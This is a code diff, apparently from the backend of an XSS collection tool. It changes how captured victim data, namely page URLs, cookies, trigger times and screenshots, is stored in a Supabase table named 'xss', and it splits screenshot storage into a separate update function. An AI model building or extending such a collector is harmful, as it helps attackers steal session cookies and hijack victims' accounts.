@@ -44,11 +44,26 @@ async function insertToSupabaseAsync(url, cookie, screenshot, trigger_time) {
 
   const { data, error } = await supabase
     .from('xss')
-    .insert([{ url, cookie, screenshot, trigger_time }]);
+    .insert([{ url, cookie, trigger_time }]);
+  updateScreenshotAsync(url,screenshot)
 
   if (error) {
-    console.error(error)
     throw new Error(`插入数据库失败: ${error.message}`);
   }
+
   console.log('数据已异步插入 Supabase:', data);
+}
+
+async function updateScreenshotAsync(url, screenshot) {
+
+  const { data, error } = await supabase
+    .from('xss')
+    .update({ screenshot })  // 更新 screenshot 字段
+    .eq('url', url);          // 根据 url 找到对应的记录
+
+  if (error) {
+    throw new Error(`更新数据库失败: ${error.message}`);
+  }
+
+  console.log('截图已异步更新至 Supabase:', data);
 }
